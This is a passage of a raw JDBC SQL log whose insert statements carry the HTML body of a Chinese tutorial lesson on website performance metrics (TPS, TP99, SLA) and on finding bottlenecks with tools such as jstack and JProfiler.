data-slate-leaf="true" data-offset-key="411:0" data-first-offset="true"><span data-slate-string="true">一般说来，延迟会先上升，随着延迟的上升，吞吐量增大的斜率会越来越小，直到达到最高点，之后开始回落。请注意这个系统能达到的最佳吞吐量的点，这个点往往意味着延迟已经开始增大一小段时间了，因此对于一些延迟要求比较高的系统，我们是不允许它达到这个吞吐量的最高点的。</span></span></span> 
</div> <div class="se-129bd066 " data-slate-type="paragraph" data-slate-object="block" data-key="412"> 
<span data-slate-object="text" data-key="413"><span data-slate-leaf="true" data-offset-key="413:0" 
data-first-offset="true"><span data-slate-string="true">从这个图我们也可以看出，</span></span></span><span 
data-slate-object="text" data-key="414"><span data-slate-leaf="true" data-offset-key="414:0" 
data-first-offset="true"><span class="se-1736331f" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">如果我们不做流量控制，在系统压力大到一定程度的时候，系统并非只能做它“力所能及”的工作，而往往是“什么也做不成”了。</span></span></span></span><span 
data-slate-object="text" data-key="415"><span data-slate-leaf="true" data-offset-key="415:0" 
data-first-offset="true"><span data-slate-string="true">这也是一些不够健壮的系统，在压力较大的特殊业务场景，直接崩溃，对所有用户都拒绝服务的原因。</span></span></span> 
</div> <div class="se-afe8b5e0 " data-slate-type="paragraph" data-slate-object="block" data-key="416"> 
<span data-slate-object="text" data-key="417"><span data-slate-leaf="true" data-offset-key="417:0" 
data-first-offset="true"><span data-slate-string="true">其它较常见的业务角度定义的性能指标还包括：</span></span></span> 
</div> <div class="se-56c655d2" data-slate-type="list" data-slate-object="block" data-key="418"> 
<div class="se-a9862f3a se-012c5467" data-slate-type="list-line" data-slate-object="block" 
data-key="419"> <span data-slate-object="text" data-key="420"><span data-slate-leaf="true" 
data-offset-key="420:0" data-first-offset="true"><span data-slate-string="true">TPS：Transactions 
Per Second，每秒处理的事务数。相似的还有 QPS，Queries Per Second，每秒处理的查询数量等等。</span></span></span> </div> <div 
class="se-bbb212cc se-66e9e830" data-slate-type="list-line" data-slate-object="block" data-key="421"> 
<span data-slate-object="text" data-key="422"><span data-slate-leaf="true" data-offset-key="422:0" 
data-first-offset="true"><span data-slate-string="true">并发用户数：同一时间有多少用户在使用系统。对于网站来说，由于 HTTP 
连接的无状态性，往往会使用服务端的会话数量来定义有多少用户同时访问系统。</span></span></span> </div> <div class="se-2df654c9 se-a54360c3" 
data-slate-type="list-line" data-slate-object="block" data-key="423"> <span data-slate-object="text" 
data-key="424"><span data-slate-leaf="true" data-offset-key="424:0" data-first-offset="true"><span 
data-slate-string="true">TP99：指的是请求中 99% 的请求能达到的性能，这里的 TP 是 Top Percentile 的缩写。比如，我们说某系统响应时间的 
TP99 是 1 秒，指的就是 99% 的请求，都可以在 1 秒之内响应，至于剩下的 1% 就不一定了。</span></span></span> </div> </div> <div 
class="se-71452250 " data-slate-type="paragraph" data-slate-object="block" data-key="425"> 
<span data-slate-object="text" data-key="426"><span data-slate-leaf="true" data-offset-key="426:0" 
data-first-offset="true"><span data-slate-string="true">关于 TP99，为什么我们使用这种分布比例的方式，而不是使用简单的平均数来定义呢？</span></span></span> 
</div> <div class="se-dfd46e8f " data-slate-type="paragraph" data-slate-object="block" data-key="427"> 
<span data-slate-object="text" data-key="428"><span data-slate-leaf="true" data-offset-key="428:0" 
data-first-offset="true"><span data-slate-string="true">这是因为</span></span></span><span data-slate-object="text" 
data-key="429"><span data-slate-leaf="true" data-offset-key="429:0" data-first-offset="true"><span 
class="se-676e7f19" data-slate-type="bold" data-slate-object="mark"><span data-slate-string="true">性能平均数在真实的系统中往往不科学</span></span></span></span><span 
data-slate-object="text" data-key="430"><span data-slate-leaf="true" data-offset-key="430:0" 
data-first-offset="true"><span data-slate-string="true">。举例来说，在一个系统的 100 个请求中，99 个都在 1 秒左右返回了，还有一个 
100 秒还不返回，那平均时间会大于 (99 x 1 + 1 x 100) / 100，大约等于 2 秒，这显然不能反映系统的真实情况。因为那一个耗时特别长的请求其实是一个异常，而非正常的请求，正常的请求平均时间就是 
1 秒，而 TP99 就比较能反映真实情况了，因为 TP99 就可以达到 1 秒。</span></span></span> </div> <div class="se-a743f572 
" data-slate-type="paragraph" data-slate-object="block" data-key="431"> <span data-slate-object="text" 
data-key="432"><span data-slate-leaf="true" data-offset-key="432:0" data-first-offset="true"><span 
data-slate-string="true">有了 TP99 这样的概念，就可以定义系统的 SLA 了，SLA 是 Service-Level Agreement，它是系统对于它的客户所承诺的可以提供的服务质量，既包括功能，也包括性能。在性能方面，SLA 
的核心定义往往就是基于 Top Percentile 来进行的。比方说，一个网站的 SLA 要求它对于浏览器响应时间的 TP95 为 3 秒。</span></span></span> 
</div> <h3 class="se-58731199" data-slate-type="heading" data-slate-object="block" data-key="433"><span 
data-slate-object="text" data-key="434"><span data-slate-leaf="true" data-offset-key="434:0" 
data-first-offset="true"><span data-slate-string="true">2. 资源角度</span></span></span></h3> <div 
class="se-74c3c34f " data-slate-type="paragraph" data-slate-object="block" data-key="435"> 
<span data-slate-object="text" data-key="436"><span data-slate-leaf="true" data-offset-key="436:0" 
data-first-offset="true"><span data-slate-string="true">相应的，资源指标包括 CPU 占用、内存占用、磁盘 I/O、网络 I/O 
等等。常规来讲，平均使用率和峰值都是我们比较关心的两个数据。一般我们可以把系统上限的一个比例，比如 60% 或者 80% 定义为一个安全阈值，一旦超过（比如 x 分钟内有 y 次检测到指标超过该阈值，这种复杂指标设置的目的在于考虑性能波动，减少假警报）就要告警。</span></span></span> 
</div> <h2 class="se-125bac23" data-slate-type="heading" data-slate-object="block" data-key="437"><span 
data-slate-object="text" data-key="438"><span data-slate-leaf="true" data-offset-key="438:0" 
data-first-offset="true"><span data-slate-string="true">寻找性能瓶颈</span></span></span></h2> <div 
class="se-66adb258 " data-slate-type="paragraph" data-slate-object="block" data-key="439"> 
<span data-slate-object="text" data-key="440"><span data-slate-leaf="true" data-offset-key="440:0" 
data-first-offset="true"><span data-slate-string="true">很多时候，如果我们能找到系统的性能瓶颈，其实就已经解决了一半问题。值得注意的是，性能的瓶颈并不是系统暴露在表面的问题，比如，TP99 
的延迟不达标是表面问题，而不是系统瓶颈。</span></span></span> </div> <h3 class="se-b7c362af" data-slate-type="heading" 
data-slate-object="block" data-key="441"><span data-slate-object="text" data-key="442"><span 
data-slate-leaf="true" data-offset-key="442:0" data-first-offset="true"><span data-slate-string="true">大致思路</span></span></span></h3> 
<div class="se-bdff15db " data-slate-type="paragraph" data-slate-object="block" data-key="443"> 
<span data-slate-object="text" data-key="444"><span data-slate-leaf="true" data-offset-key="444:0" 
data-first-offset="true"><span data-slate-string="true">在性能优化这个繁琐的过程当中，一要寻找问题，二才是解决问题，而寻找性能瓶颈就和寻找根本原因有关，也是一个很有意思的事儿。不同的人显然会有不同的看法，我在网站项目中进行性能瓶颈的定位时，常常会遵循下面几个步骤，换句话说，这个步骤来自于我的经验：</span></span></span> 
</div> <div class="se-c5017128 " data-slate-type="paragraph" data-slate-object="block" data-key="445"> 
<span data-slate-object="text" data-key="446"><span data-slate-leaf="true" data-offset-key="446:0" 
data-first-offset="true"><span class="se-4a861176" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">首先，我们应该对系统有一个大致的预期。</span></span></span></span><span data-slate-object="text" 
data-key="447"><span data-slate-leaf="true" data-offset-key="447:0" data-first-offset="true"><span 
data-slate-string="true">举例来说，根据现有的架构和硬件，在当前的请求模型下，我们希望单台机器能够负载 100 TPS 的请求，这些是设计阶段就考虑清楚的。我看到有些项目中，这些没有在开始定义清楚，等系统大致做好了，再来定义性能目标，这时候把性能优化的工程师推上去优化，就缺乏一定的目的性，谁也不知道优化到什么程度是个头。比方说，当前性能是 
80 TPS，那么要优化到 100 TPS，可能小修小补，很小的代价就可以做到；但是要优化到 500 TPS，那么很可能要在产品和架构上做调整，代价往往是很不一样的，没有预期而直接生米煮熟饭显然是不合工程性的。</span></span></span> 
</div> <div class="se-dda08e2f " data-slate-type="paragraph" data-slate-object="block" data-key="448"> 
<span data-slate-object="text" data-key="449"><span data-slate-leaf="true" data-offset-key="449:0" 
data-first-offset="true"><span class="se-e8a4f88e" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">其次，过一遍待优化业务的环境、配置、代码，对于整个请求的处理流程做到心中有数。</span></span></span></span><span 
data-slate-object="text" data-key="450"><span data-slate-leaf="true" data-offset-key="450:0" 
data-first-offset="true"><span data-slate-string="true">说白了，这就是走读代码，这个代码既包括应用的源码，也要了解环境和配置，知道整个流程的处理一步一步是怎样进行的。比如说，浏览器上用户触发事件以后，服务端的应用从线程池里面取得了线程来处理请求，接着查询了几次数据库，每次都从连接池中取出或建立连接，进行若干的查询或事务读写操作，再对响应做序列化返回浏览器，而浏览器收到请求以后又进行解析并将执行渲染。值得一提的是，这个过程中，全栈工程师的价值就体现出来了，因为他能够有端到端的视野来看待这个问题，分析整个流程。</span></span></span> 
</div> <div class="se-28c8e813 " data-slate-type="paragraph" data-slate-object="block" data-key="451"> 
<span data-slate-object="text" data-key="452"><span data-slate-leaf="true" data-offset-key="452:0" 
data-first-offset="true"><span class="se-ef5221e2" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">再次，开始压测，缓慢、逐步增大请求速率，直到预期的业务角度的性能指标无法再提升，待系统稳定。</span></span></span></span><span 
data-slate-object="text" data-key="453"><span data-slate-leaf="true" data-offset-key="453:0" 
data-first-offset="true"><span data-slate-string="true">有些指标可能一开始就不满足要求，比如某系统的延迟，在一开始就不达标；也有时候是随着压力增大才发现不达标的，比如多数系统的吞吐量，随着压力增大，吞吐量上不去了。通常，我们可以给到系统一个足够的压力，或者等于、甚至高于系统最大的吞吐量，且待系统稳定后，再来分析，这种情况下我们可以把问题暴露得更彻底。</span></span></span> 
</div> <div class="se-6a24f7c8 " data-slate-type="paragraph" data-slate-object="block" data-key="454"> 
<span data-slate-object="text" data-key="455"><span data-slate-leaf="true" data-offset-key="455:0" 
data-first-offset="true"><span class="se-7658e54a" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">最后，才是根据业务角度的指标来进行特定的分析</span></span></span></span><span data-slate-object="text" 
data-key="456"><span data-slate-leaf="true" data-offset-key="456:0" data-first-offset="true"><span 
data-slate-string="true">，我就以最常见的延迟和吞吐量这两个为例来说明。</span></span></span> </div> <div class="se-0673b721 
" data-slate-type="paragraph" data-slate-object="block" data-key="457"> <span data-slate-object="text" 
data-key="458"><span data-slate-leaf="true" data-offset-key="458:0" data-first-offset="true"><span 
class="se-ae0a5515" data-slate-type="bold" data-slate-object="mark"><span data-slate-string="true">1. 
对于延迟一类的问题</span></span></span></span> </div> <div class="se-d47c5d2c " data-slate-type="paragraph" 
data-slate-object="block" data-key="459"> <span data-slate-object="text" data-key="460"><span 
data-slate-leaf="true" data-offset-key="460:0" data-first-offset="true"><span data-slate-string="true">从大的流程到小的环节，从操作系统到应用本身，逐步定位，寻找端到端的时间消耗在哪里。比方说，可以</span></span></span><span 
data-slate-object="text" data-key="461"><span data-slate-leaf="true" data-offset-key="461:0" 
data-first-offset="true"><span class="se-332d11ec" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">优先考虑系统快照类的工具</span></span></span></span><span data-slate-object="text" 
data-key="462"><span data-slate-leaf="true" data-offset-key="462:0" data-first-offset="true"><span 
data-slate-string="true">，像是 jstack、kill -3 命令可以打印系统当前的线程执行堆栈，因为这一类工具往往执行比较简单，对系统的影响较小；如果还需要进一步明确，</span></span></span><span 
data-slate-object="text" data-key="463"><span data-slate-leaf="true" data-offset-key="463:0" 
data-first-offset="true"><span class="se-869f3ead" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">其次再考虑侵入性较强的，运行时剖面分析（profile）类型的工具</span></span></span></span><span 
data-slate-object="text" data-key="464"><span data-slate-leaf="true" data-offset-key="464:0" 
data-first-offset="true"><span data-slate-string="true">，比如 JProfiler。如果发现运行的 50 个线程里面，有 48 
个卡在等某一个锁的释放上面，这就值得怀疑该锁的占用是造成延迟问题的罪魁祸首。</span></span></span> </div> <div class="se-5161f551 
" data-slate-type="paragraph" data-slate-object="block" data-key="465"> <span data-slate-object="text" 
data-key="466"><span data-slate-leaf="true" data-offset-key="466:0" data-first-offset="true"><span 
class="se-e9de66e3" data-slate-type="bold" data-slate-object="mark"><span data-slate-string="true">2. 
对于吞吐量一类的问题</span></span></span></span> </div> <div class="se-2f8fc6d2 " data-slate-type="paragraph" 
data-slate-object="block" data-key="467"> <span data-slate-object="text" data-key="468"><span 
data-slate-leaf="true" data-offset-key="468:0" data-first-offset="true"><span data-slate-string="true">这类问题 
CPU 是核心。在请求速率逐步增大时，我们来看这样四种情况：</span></span></span> </div> <div class="se-14013f76" data-slate-type="list" 
data-slate-object="block" data-key="469"> <div class="se-6ba19e54 se-92987b47" data-slate-type="list-line" 
data-slate-object="block" data-key="470"> <span data-slate-object="text" data-key="471"><span 
data-slate-leaf="true" data-offset-key="471:0" data-first-offset="true"><span class="se-10cc428d" 
data-slate-type="bold" data-slate-object="mark"><span data-slate-string="true">吞吐量逐步上升，而 CPU 
变化很小。</span></span></span></span><span data-slate-object="text" data-key="472"><span data-slate-leaf="true" 
data-offset-key="472:0" data-first-offset="true"><span data-slate-string="true">这种情况说明系统设计得比较好，能继续“扛”更高的负载，该阶段可以继续增大请求速率。</span></span></span> 
</div> <div class="se-0e831060 se-f5116ab0" data-slate-type="list-line" data-slate-object="block" 
data-key="473"> <span data-slate-object="text" data-key="474"><span data-slate-leaf="true" 
data-offset-key="474:0" data-first-offset="true"><span class="se-957ab8b8" data-slate-type="bold" 
data-slate-object="mark"><span data-slate-string="true">吞吐量逐步上升，而 CPU 也平稳上升。</span></span></span></span><span 
data-slate-object="text" data-key="475"><span data-slate-leaf="true" data-offset-key="475:0" 
data-first-offset="true"><span data-slate-string="true">其实这还算是一种较为理想的系统，CPU 使用随着吞吐量的上升而平稳上升，直到 
CPU 成为瓶颈——这里的原因很简单，用于业务处理的 CPU 是真正“干活的”，这部分的消耗显然是少不了的。如果这种情况下 CPU 已经很高了却还要优化，那就是说在不能动硬件的情况下，我们需要改进算法了，因为 
CPU 已经在拼命干活了。就像程序员一周已经加班五十个小时了，还要再压迫他们，就要出事（系统崩溃）了。</span></span></span> </div> <div class="se-c35c25b8 
se-ab6452e2" data-slate-type="list-line" data-slate-object="block" data-key="476"> <span data-slate-object="text" 
data-key="477"><span data-slate-leaf="true" data-offset-key="477:0" data-first-offset="true"><span 
class="se-5ea22f1f" data-slate-type="bold" data-slate-object="mark"><span data-slate-string="true">吞吐量变化很小甚至回落，而 
CPU 大幅上升。</span></span></span></span><span data-slate-object="text" data-key="478"><span data-slate-leaf="true" 
data-offset-key="478:0" data-first-offset="true"><span data-slate-string="true">这种情况说明 CPU 
的确在干活，却不是用于预期内的“业务处理”。最典型的例子就是，内存泄漏，系统在一个劲地 GC，CPU 看起来忙得要命，但是却不是忙于业务。</span></span></span> 
</div> <div class="se-03a573e6 se-a0be8c89" data-slate-type="list-line" data-slate-object="block" 
data-key="479"> <span data-slate-object="text" data-key="480"><span data-slate-leaf="true" 
data-offset-key="480:0" data-first-offset="true"><span class="se-6478a3f2" data-slate-type="bold" 
data-slate-object="mark"><span data-slate-string="true">吞吐量上不去，CPU 也上不去。</span></span></span></span><span 
data-slate-object="text" data-key="481"><span data-slate-leaf="true" data-offset-key="481:0" 
data-first-offset="true"><span data-slate-string="true">这种情况其实非常常见，而且随着压力的增大，它往往伴随着延迟的上升。这种情况是说，CPU 
无法成为瓶颈，因为其它瓶颈先出现了，因此这种情况下就要检查磁盘 I/O、网络带宽、工作线程数等等。这就像是一个运动员的潜力（CPU）还很大，但是由于种种原因，比如技巧问题、心理原因，潜力发挥不出来，因此我们优化的目的，就是努力找到并移除当前的瓶颈，将 
CPU 的这个潜力发挥出来。</span></span></span> </div> </div> <h3 class="se-1740748e" data-slate-type="heading" 
data-slate-object="block" data-key="482"><span data-slate-object="text" data-key="483"><span 
data-slate-leaf="true" data-offset-key="483:0" data-first-offset="true"><span data-slate-string="true">工具的分类</span></span></span></h3> 
<div class="se-d45642ad " data-slate-type="paragraph" data-slate-object="block" data-key="484"> 
<span data-slate-object="text" data-key="485"><span data-slate-leaf="true" data-offset-key="485:0" 
data-first-offset="true"><span data-slate-string="true">在定位性能瓶颈的过程中，我们会和各种各样的工具打交道，在我看来，这些工具中最典型的有这样三种类型：</span></span></span> 
</div> <div class="se-92976acf" data-slate-type="list" data-slate-object="block" data-key="486"> 
<div class="se-6db98f43 se-e0efceff" data-slate-type="list-line" data-slate-object="block" 
data-key="487"> <span data-slate-object="text" data-key="488"><span data-slate-leaf="true" 
data-offset-key="488:0" data-first-offset="true"><span data-slate-string="true">截取型：截取系统某个层面的一个快照加以分析。比如一些堆栈切面和分析的工具，jstack、jmap、kill 
-3、MAT、Heap Analyser 等，这类工具使用简单，对系统影响往往比较小。</span></span></span> </div> <div class="se-616d3e5e 
se-2b309b61" data-slate-type="list-line" data-slate-object="block" data-key="489"> <span data-slate-object="text" 
data-key="490"><span data-slate-leaf="true" data-offset-key="490:0" data-first-offset="true"><span 
data-slate-string="true">监控型：监视、剖析系统变化，甚至数据流向。比如 JProfiler、JConsole、JStat、BTrace 等等，如前文所述，这类工具的侵入性往往更高，甚至本身就会大幅影响性能。</span></span></span> 
</div> <div class="se-c173c742 se-c0e74b62" data-slate-type="list-line" data-slate-object="block" 
data-key="491"> <span data-slate-object="text" data-key="492"><span data-slate-leaf="true" 
data-offset-key="492:0" data-first-offset="true"><span data-slate-string="true">验尸型：系统已经宕机或完成运行任务了，但是留下了一些“罪证”，我们在事后来分析它们。最有名的就是 
JVM 挂掉之后可能会留下的 hs_err_pid.log，或者是生成的 crash dump 文件。</span></span></span> </div> </div> <h2 
class="se-64d0fd61" data-slate-type="heading" data-slate-object="block" data-key="493"><span 
data-slate-object="text" data-key="494"><span data-slate-leaf="true" data-offset-key="494:0" 
data-first-offset="true"><span data-slate-string="true">总结思考</span></span></span></h2> <div 
class="se-87eed30b " data-slate-type="paragraph" data-slate-object="block" data-key="495"> 
<span data-slate-object="text" data-key="496"><span data-slate-leaf="true" data-offset-key="496:0" 
data-first-offset="true"><span data-slate-string="true">今天我们学习了性能优化的基本知识，包括性能优化和软件设计的关系，性能指标和关注点，以及怎样去寻找性能瓶颈，希望你能够理解，在跳进性能优化的“坑”之前先有了足够的认识、分析和思考。</span></span></span> 
</div> <div class="se-7b66fde3 " data-slate-type="paragraph" data-slate-object="block" data-key="497"> 
<span data-slate-object="text" data-key="498"><span data-slate-leaf="true" data-offset-key="498:0" 
data-first-offset="true"><span data-slate-string="true">现在，我来提一个问题吧：对于下面这些资源角度定义的性能指标，你能说说在 
Linux 下，该用怎样的工具或命令来查看吗？</span></span></span> </div> <div class="se-ea17fbbf" data-slate-type="list" 
data-slate-object="block" data-key="499"> <div class="se-2ee118c8 se-422be6bd" data-slate-type="list-line" 
data-slate-object="block" data-key="500"> <span data-slate-object="text" data-key="501"><span 
data-slate-leaf="true" data-offset-key="501:0" data-first-offset="true"><span data-slate-string="true">CPU 
使用率、负载；</span></span></span> </div> <div class="se-543cba58 se-ca9a5cfc" data-slate-type="list-line" 
data-slate-object="block" data-key="502"> <span data-slate-object="text" data-key="503"><span 
data-slate-leaf="true" data-offset-key="503:0" data-first-offset="true"><span data-slate-string="true">可用内存、换页；</span></span></span> 
</div> <div class="se-0b2df593 se-00bcaa34" data-slate-type="list-line" data-slate-object="block" 
data-key="504"> <span data-slate-object="text" data-key="505"><span data-slate-leaf="true" 
data-offset-key="505:0" data-first-offset="true"><span data-slate-string="true">磁盘 I/O；</span></span></span> 
</div> <div class="se-a8702aff se-ad55ff5f" data-slate-type="list-line" data-slate-object="block" 
data-key="506"> <span data-slate-object="text" data-key="507"><span data-slate-leaf="true" 
data-offset-key="507:0" data-first-offset="true"><span data-slate-string="true">网络 I/O；</span></span></span> 
</div> <div class="se-fd6505b6 se-0b6725a7" data-slate-type="list-line" data-slate-object="block" 
data-key="508"> <span data-slate-object="text" data-key="509"><span data-slate-leaf="true" 
data-offset-key="509:0" data-first-offset="true"><span data-slate-string="true">应用进程、线程。</span></span></span> 
</div> </div> <div class="se-5ecc72a1 " data-slate-type="paragraph" data-slate-object="block" 
data-key="510"> <span data-slate-object="text" data-key="511"><span data-slate-leaf="true" 
data-offset-key="511:0" data-first-offset="true"><span data-slate-string="true">最后，欢迎你来分享你在性能优化中做测试和寻找性能瓶颈的故事，我相信这些经历，都会很有意思。</span></span></span> 
</div> <h2 class="se-671afc3a" data-slate-type="heading" data-slate-object="block" data-key="512"><span 
data-slate-object="text" data-key="513"><span data-slate-leaf="true" data-offset-key="513:0" 
data-first-offset="true"><span data-slate-string="true">扩展阅读</span></span></span></h2> <div 
class="se-859c7ee7" data-slate-type="list" data-slate-object="block" data-key="514"> <div class="se-8dfacf3f 
se-2551d7a2" data-slate-type="list-line" data-slate-object="block" data-key="515"> <span data-slate-object="text" 
data-key="516"><span data-slate-leaf="true" data-offset-key="516:0" data-first-offset="true"><span 
data-slate-string="true">关于性能指标，我提供两篇文章你可以做扩展，一篇是</span></span></span><a data-slate-type="link" 
data-slate-object="inline" data-key="517" class="se-bd361ee3 se-f81bfce9"><span data-slate-object="text" 
data-key="518"><span data-slate-leaf="true" data-offset-key="518:0" data-first-offset="true"><span 
data-slate-string="true">美团性能优化之路——性能指标体系</span></span></span></a><span data-slate-object="text" 
data-key="519"><span data-slate-leaf="true" data-offset-key="519:0" data-first-offset="true"><span 
data-slate-string="true">，另一篇是</span></span></span><a data-slate-type="link" data-slate-object="inline" 
data-key="520" class="se-bd361ee3 se-f81bfce9"><span data-slate-object="text" data-key="521"><span 
data-slate-leaf="true" data-offset-key="521:0" data-first-offset="true"><span data-slate-string="true">性能测试中服务器关键性能指标浅析</span></span></span></a><span 
data-slate-object="text" data-key="522"><span data-slate-leaf="true" data-offset-key="522:0" 
data-first-offset="true"><span data-slate-string="true">。</span></span></span> </div> <div 
class="se-8233582f se-9b8bfce0" data-slate-type="list-line" data-slate-object="block" data-key="523"> 
<span data-slate-object="text" data-key="524"><span data-slate-leaf="true" data-offset-key="524:0" 
data-first-offset="true"><span data-slate-string="true">第二篇也相关，来自阿里云性能测试 PTS 的官方文档，</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="525" class="se-bd361ee3 se-f81bfce9"><span 
data-slate-object="text" data-key="526"><span data-slate-leaf="true" data-offset-key="526:0" 
data-first-offset="true"><span data-slate-string="true">测试指标</span></span></span></a><span 
data-slate-object="text" data-key="527"><span data-slate-leaf="true" data-offset-key="527:0" 
data-first-offset="true"><span data-slate-string="true">，当然，对于文档中感兴趣的章节你也可以一并通读。</span></span></span> 
</div> </div> <div class="se-aa904147" data-slate-type="image" data-slate-object="block" data-key="528"> 
<img class="se-8132fb99" src="https://static001.geekbang.org/resource/image/11/8b/1181246bbd51ce348d5729696d1dc28b.jpg"> 
</div> </div>', '', 'book', 0, 'full_html', 'zh-hans', 11, 11) 
 {executed in 1 msec}
2020-11-19 11:05:45.117 INFO  jdbc.sqltiming Line:373 - select nodebodyen0_.entity_id as entity_i1_3_0_, nodebodyen0_.body_value as body_val2_3_0_, 
nodebodyen0_.body_summary as body_sum3_3_0_, nodebodyen0_.bundle as bundle4_3_0_, nodebodyen0_.delta 
as delta5_3_0_, nodebodyen0_.body_format as body_for6_3_0_, nodebodyen0_.langcode as langcode7_3_0_, 
nodebodyen0_.revision_id as revision8_3_0_ from node__body nodebodyen0_ where nodebodyen0_.entity_id=11 
 {executed in 0 msec}
2020-11-19 11:05:45.118 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 11:05:45.120 INFO  jdbc.sqltiming Line:373 - insert into node__body (body_value, body_summary, bundle, delta, body_format, langcode, revision_id, 
entity_id) values ('<div data-slate-editor="true" data-key="334" autocorrect="off" spellcheck="false" 
data-gramm="false" style="outline: none; white-space: pre-wrap; overflow-wrap: break-word;"> 
<div class="se-06c70855 " data-slate-type="paragraph" data-slate-object="block" data-key="335"> 
<span data-slate-object="text" data-key="336"><span data-slate-leaf="true" data-offset-key="336:0" 
data-first-offset="true"><span data-slate-string="true">你好，我是四火。</span></span></span> </div> 
<div class="se-a431d854 " data-slate-type="paragraph" data-slate-object="block" data-key="337"> 
<span data-slate-object="text" data-key="338"><span data-slate-leaf="true" data-offset-key="338:0" 
data-first-offset="true"><span data-slate-string="true">从今天开始我们进入“专题”这一章，本章的内容会涉及一些不适合单独归纳到前面任何一章的话题，比如这一讲和下一讲，我们来聊一聊网站的性能优化。</span></span></span> 
</div> <div class="se-a9892de7 " data-slate-type="paragraph" data-slate-object="block" data-key="339"> 
<span data-slate-object="text" data-key="340"><span data-slate-leaf="true" data-offset-key="340:0" 
data-first-offset="true"><span data-slate-string="true">具体说，在这两讲性能专题中，第一讲我将介绍性能优化的基本知识，包括性能优化和软件设计的关系，性能指标和关注点，以及怎样去寻找性能瓶颈，这些是我们需要优先明确、分析和思考的内容，而不是没头没脑地直接跳进问题的坑去“优化”；而第二讲则要讲真正的“优化”了，我将从产品和架构调整，后端和持久层优化，以及前端和网络层优化这样三个方面结合例子来介绍具体的性能优化技术。</span></span></span> 
</div> <h2 class="se-107c6776" data-slate-type="heading" data-slate-object="block" data-key="341"><span 
data-slate-object="text" data-key="342"><span data-slate-leaf="true" data-offset-key="342:0" 
data-first-offset="true"><span data-slate-string="true">性能优化与软件设计</span></span></span></h2> 
<div class="se-7b0df438 " data-slate-type="paragraph" data-slate-object="block" data-key="343"> 
<span data-slate-object="text" data-key="344"><span data-slate-leaf="true" data-offset-key="344:0" 
data-first-offset="true"><span data-slate-string="true">在最开始的部分，我想明确最重要的一件事——也许你已经听说过这句话——“</span></span></span><span 
data-slate-object="text" data-key="345"><span data-slate-leaf="true" data-offset-key="345:0" 
data-first-offset="true"><span class="se-7f60d9c1" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">好的性能是设计出来的，而不是优化出来的</span></span></span></span><span data-slate-object="text" 
data-key="346"><span data-slate-leaf="true" data-offset-key="346:0" data-first-offset="true"><span 
data-slate-string="true">”。这就像是“高质量的软件是设计出来的，而不是测试出来的”一样，强调的都是软件设计的地位。因此，在设计阶段不考虑性能，而寄希望于在上线前后通过集中式的性能优化突击来将网站性能提高到另一个层次，往往是主次颠倒的。</span></span></span> 
</div> <div class="se-eb5e965e " data-slate-type="paragraph" data-slate-object="block" data-key="347"> 
<span data-slate-object="text" data-key="348"><span data-slate-leaf="true" data-offset-key="348:0" 
data-first-offset="true"><span data-slate-string="true">我来举一个实际的例子说明下这一点吧。</span></span></span> 
</div> <div class="se-ba15a0de " data-slate-type="paragraph" data-slate-object="block" data-key="349"> 
<span data-slate-object="text" data-key="350"><span data-slate-leaf="true" data-offset-key="350:0" 
data-first-offset="true"><span data-slate-string="true">在我参加工作不久后，曾经参与过的一个项目，用户的所有读写操作都要入库，当时的设计是把这样的数据放到关系数据库一个用户行为的表中，以供后续的查阅。上线以后，由于用户量大，操作频繁，很快这张表就变得巨大，读写的性能瓶颈都在这张表上，而且所有用户的操作都受到了影响，因为所有的操作都要写入这张表，在这时我被卷入这个项目，希望尽快解决这个性能问题。说实话，最初设计的时候没有考虑好，而这时候要做小修小改来解决这个功能的性能问题，是比较困难的。</span></span></span> 
</div> <div class="se-7d2bb6c7 " data-slate-type="paragraph" data-slate-object="block" data-key="351"> 
<span data-slate-object="text" data-key="352"><span data-slate-leaf="true" data-offset-key="352:0" 
data-first-offset="true"><span data-slate-string="true">具体来说，如果在设计阶段，这里其实是有很多可以考虑的因素的，它们都可以帮助提前介入这个性能隐患的分析和解决：</span></span></span> 
</div> <div class="se-46e0b985 " data-slate-type="paragraph" data-slate-object="block" data-key="353"> 
<span data-slate-object="text" data-key="354"><span data-slate-leaf="true" data-offset-key="354:0" 
data-first-offset="true"><span class="se-051fb9a7" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">产品设计角度</span></span></span></span><span data-slate-object="text" data-key="355"><span 
data-slate-leaf="true" data-offset-key="355:0" data-first-offset="true"><span data-slate-string="true">，用户的行为分为读操作和写操作，我们知道写操作通常更为重要，那用户的读操作是否有那么重要，可不可以只记录写操作？这样的数据有多重要，丢失的代价有多大，数据保密性是怎样的？这决定了一致性要求和数据存储在客户端是否可能。历史数据是怎样消费的，即数据访问模型是怎样的，那个时候 
NoSQL 还没有兴起，但是如果不需要复杂的关系查询，这里还是可以有很大的优化空间的。</span></span></span> </div> <div class="se-b6b96a7b 
" data-slate-type="paragraph" data-slate-object="block" data-key="356"> <span data-slate-object="text" 
data-key="357"><span data-slate-leaf="true" data-offset-key="357:0" data-first-offset="true"><span 
class="se-9e6be6b3" data-slate-type="bold" data-slate-object="mark"><span data-slate-string="true">技术实现角度</span></span></span></span><span 
data-slate-object="text" data-key="358"><span data-slate-leaf="true" data-offset-key="358:0" 
data-first-offset="true"><span data-slate-string="true">，能否以某种方式保留最近的若干条记录即可？这将允许某一种方式进行定期的数据淘汰、清理和归档。归档文件的组织形式又和数据访问模型有关，因为归档文件不支持任意的关系查询，那该怎样去支持特定的业务查询模型呢？比如将较老的记录归档到以用户 
ID 和时间打散的历史文件中去，目的都是保证表的大小可控。哪怕是面对最糟糕的看似没有办法的“窘境”，只要预先考虑到了，我们还有对于数据库表进行 sharding 或者 partition 
这样的看似“不优雅”，但是也能解决问题的通用方法。</span></span></span> </div> <div class="se-7d0cda62 " data-slate-type="paragraph" 
